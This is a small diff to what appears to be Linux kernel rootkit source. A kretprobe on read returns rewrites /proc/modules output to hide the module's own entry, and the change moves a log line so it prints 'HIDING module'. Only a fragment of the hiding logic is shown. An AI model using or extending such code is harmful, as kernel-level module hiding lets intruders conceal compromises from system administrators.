@@ -186,7 +186,6 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
             regs_set_return_value(regs, new_length);
         }
         else if(strcmp(path, "/modules") == 0){
-            pr_info("reading /proc/modules\n");
             int module_name_len = strlen(KBUILD_MODNAME);
 
             char* delete_from_ptr = NULL;
@@ -215,6 +214,7 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
             }
 
             if(delete_from_ptr){
+                pr_info("HIDING module %s\n", KBUILD_MODNAME);
                 int offset = (int)(delete_from_ptr - args->buffer_ptr);
 
                 // if not at end copy to override the line to hide
